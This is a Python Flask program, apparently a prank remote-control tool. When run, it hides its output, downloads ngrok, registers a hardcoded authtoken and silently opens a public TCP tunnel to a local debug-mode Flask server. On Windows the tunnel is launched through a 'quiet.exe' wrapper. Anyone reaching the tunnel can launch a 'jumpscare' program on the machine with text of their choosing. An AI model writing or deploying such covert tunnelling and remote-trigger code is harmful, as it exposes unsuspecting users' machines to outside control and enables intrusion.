from flask import *
import os
import sys
import subprocess
import requests
import tempfile
import time
import zipfile
from sys import platform

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


template_folder = resource_path("templates")
if getattr(sys, 'frozen', False):
    template_folder = os.path.join(sys._MEIPASS, 'templates')

temp_dir = tempfile.gettempdir()

output = open(os.path.join(temp_dir, 'logs.txt'), "wt")
sys.stdout = output
sys.stderr = output

if platform == "win32":
    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
elif platform == "linux" or platform == "linux2":
    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"

temp_file = tempfile.NamedTemporaryFile(delete=False)
response = requests.get(url)
temp_file.write(response.content)
temp_file.close()

if platform == "win32":
    try:
        with zipfile.ZipFile(temp_file.name, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
    except:
        print("dupa")

    subprocess.Popen([str(os.path.join(temp_dir, "ngrok.exe")), "config", "add-authtoken", "1lNfa3rrEqMLFG7tsAcXfGdeFwy_2MXtvpzcDhuUBmmmPdgmt"])
    time.sleep(3)
    subprocess.Popen([resource_path("quiet.exe"), str(os.path.join(temp_dir, "ngrok.exe")), "tcp", "8080"])
elif platform == "linux" or platform == "linux2":
    hrand = os.urandom(24).hex()
    os.mkdir(os.path.join(tempfile.gettempdir(), hrand))
    tdir = os.path.join(tempfile.gettempdir(), hrand)
    os.system("tar -xvf {} -C {}".format(str(temp_file.name), str(tdir)))

    subprocess.Popen([str(os.path.join(tdir, "ngrok")), "config", "add-authtoken", "1lNfa3rrEqMLFG7tsAcXfGdeFwy_2MXtvpzcDhuUBmmmPdgmt"])
    time.sleep(3)
    subprocess.Popen([str(os.path.join(tdir, "ngrok")), "tcp", "8080"])

app = Flask(__name__, template_folder=template_folder)
app.config["DEBUG"] = True

app._static_folder = resource_path('static')

@app.route("/", methods=["GET", "POST"])
def main_page():
    if request.method == "POST":
        bt1 = request.form.get("toilet")
        if bt1 is not None:
            text = request.form['textbox']
            if len(text) >= 2:
                if platform == "win32":
                    if getattr(sys, 'frozen', False):
                        subprocess.Popen([str(resource_path("jumpscare.exe")), "{}".format(str(text))])
                    else:
                        subprocess.Popen(["python", str(resource_path("jumpscare.py")), "{}".format(str(text))])
                elif platform == "linux" or platform == "linux2":
                    if getattr(sys, 'frozen', False):
                        subprocess.Popen([str(resource_path("jumpscare")), "{}".format(str(text))])
                    else:
                        subprocess.Popen(["python3", str(resource_path("jumpscare.py")), "{}".format(str(text))])
    return render_template('index.html')
if __name__ == '__main__':
    app.run(debug=True, port=8080, use_reloader=False)